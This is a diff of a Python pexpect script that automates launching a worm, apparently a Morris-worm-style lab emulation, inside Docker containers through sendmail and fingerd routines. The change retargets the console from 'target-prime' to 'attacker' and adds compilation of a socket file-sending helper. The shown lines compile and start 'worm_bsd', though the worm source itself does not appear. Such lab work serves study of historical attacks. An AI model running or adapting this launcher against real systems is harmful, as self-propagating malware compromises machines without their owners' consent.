@@ -3,9 +3,9 @@ import pexpect
 import time
 
 def run_sendmail():
-    # 1. Attach to target-prime console
-    print("[+] Attaching to target-prime...")
-    child = pexpect.spawn('docker attach target-prime', encoding='utf-8')
+    # 1. Attach to attacker console
+    print("[+] Attaching to attacker...")
+    child = pexpect.spawn('docker attach attacker', encoding='utf-8')
     
     # Wait 5 seconds for the container to settle
     time.sleep(5)
@@ -164,9 +164,9 @@ QUIT
     child.interact()
 
 def run_fingerd():
-    # 1. Attach to target-prime console
-    print("[+] Attaching to target-prime...")
-    child = pexpect.spawn('docker attach target-prime', encoding='utf-8')
+    # 1. Attach to attacker console
+    print("[+] Attaching to attacker...")
+    child = pexpect.spawn('docker attach attacker', encoding='utf-8')
     
     # Wait 5 seconds for the container to settle
     time.sleep(5)
@@ -183,7 +183,6 @@ def run_fingerd():
 
     # 5. Unpack the tar file manually
     print("[+] Adding fingerd worm files")
-    child.expect('# ')
     child.sendline('cd /tmp')
     child.expect('# ')
     child.sendline('mt -f /dev/rmt12 rew')
@@ -192,12 +191,14 @@ def run_fingerd():
     child.expect('# ')
     child.sendline('cc worm_bsd.c -o worm_bsd')
     child.expect('# ')
+    child.sendline('cc send_file_over_socket_bsd.c -o send_file_over_socket_bsd')
+    child.expect('# ')
     
     # 6. Wait for the shell to return
     print("[+] Files sent. Starting worm")
     child.sendline('./worm_bsd')
     
-    print("[***] Sequence Complete. Worm started on target-prime")
+    print("[***] Sequence Complete. Worm started on attacker")
     child.interact()
 
 if __name__ == "__main__":
